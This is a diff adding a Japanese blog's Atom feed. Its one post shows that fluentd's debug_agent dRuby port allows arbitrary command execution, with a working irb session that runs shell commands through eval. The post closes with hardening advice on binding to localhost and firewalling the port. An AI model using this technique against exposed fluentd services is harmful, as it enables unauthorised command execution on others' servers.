@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: fluentd | @znz blog]]></title>
+  <link href="http://blog.n-z.jp/blog/categories/fluentd/atom.xml" rel="self"/>
+  <link href="http://blog.n-z.jp/"/>
+  <updated>2014-06-13T23:31:26+09:00</updated>
+  <id>http://blog.n-z.jp/</id>
+  <author>
+    <name><![CDATA[Kazuhiro NISHIYAMA]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[fluentd に drb で接続してみた]]></title>
+    <link href="http://blog.n-z.jp/blog/2014-06-13-fluentd-drb.html"/>
+    <updated>2014-06-13T22:41:08+09:00</updated>
+    <id>http://blog.n-z.jp/blog/fluentd-drb</id>
+    <content type="html"><![CDATA[<p>druby の口が公開されていたら、そのユーザーの権限で何でも実行できるはず、
+ということで、ちょっと試してみました。</p>
+
+<!--more-->
+
+
+<h2>対象バージョン</h2>
+
+<ul>
+<li><code>ruby</code> 2.1.2</li>
+<li><code>fluentd</code> 0.10.49</li>
+</ul>
+
+
+<h2>環境の準備</h2>
+
+<p>vagrant 上で rbenv と ruby-build を使ってインストールした ruby 2.1.2 で</p>
+
+<ul>
+<li><code>gem install fluentd</code></li>
+<li><code>fluentd --setup /vagrant/fluent</code></li>
+<li><code>fluentd -c /vagrant/fluent/fluent.conf &amp;</code></li>
+</ul>
+
+
+<p>と起動して準備しておきました。</p>
+
+<h2>実行例</h2>
+
+<p><code>irb</code> を起動しているユーザーと同じユーザーで <code>fluentd</code> も起動しているので、
+特に面白いことはできそうになかったのですが、
+<code>/proc/$$/cmdline</code> を確認すると <code>irb</code> 側ではなく、
+ちゃんと <code>fluentd</code> 側で任意のコマンドが実行できていることがわかります。</p>
+
+<pre><code>vagrant@fluentd-vm:~$ rbenv exec irb -r irb/completion --simple-prompt
+&gt;&gt; require 'drb'
+=&gt; true
+&gt;&gt; d = DRbObject.new_with_uri('druby://127.0.0.1:24230'); nil
+=&gt; nil
+&gt;&gt; d.method_missing(:send, :eval, "`id`")
+=&gt; "uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)\n"
+&gt;&gt; d.method_missing(:send, :eval, '`cat /proc/$PPID/cmdline`')
+=&gt; "/opt/rbenv/versions/2.1.2/bin/ruby\x00/opt/rbenv/versions/2.1.2/bin/fluentd\x00-c\x00/vagrant/fluent/fluent.conf\x00"
+</code></pre>
+
+<h2>雑感</h2>
+
+<p><code>root</code> 権限で起動しているなら <code>debug_agent</code> は有効にしない方が良さそうだし、
+ローカルユーザーが <code>fluentd</code> の実行ユーザーの権限を使えるとまずい場合も有効にしない方が良さそうだと思いました。</p>
+
+<p>また、知っている人には当たり前のことですが、
+<code>drb</code> は外部に安全に公開できるものではないので、
+使う場合も <code>localhost</code> だけ待ち受けるように制限すべきです。</p>
+
+<p>td-agent は初期設定でそうなっているのですが、
+<code>fluentd --setup</code> はそうなっていないので、
+適切に設定を変更するなり firewall で塞ぐなりしておく必要がありそうです。</p>
+
+<h2>td-agent 1.1.19-1 での初期設定</h2>
+
+<p><code>127.0.0.1</code> だけで待ち受けるようになっていました。</p>
+
+<pre><code>## live debugging agent
+&lt;source&gt;
+  type debug_agent
+  bind 127.0.0.1
+  port 24230
+&lt;/source&gt;
+</code></pre>
+
+<h2><code>fluentd --setup</code> で生成される設定</h2>
+
+<p>外からも受けつけるようになっていました。</p>
+
+<pre><code># Listen DRb for debug
+&lt;source&gt;
+  type debug_agent
+  port 24230
+&lt;/source&gt;
+</code></pre>
+]]></content>
+  </entry>
+  
+</feed>
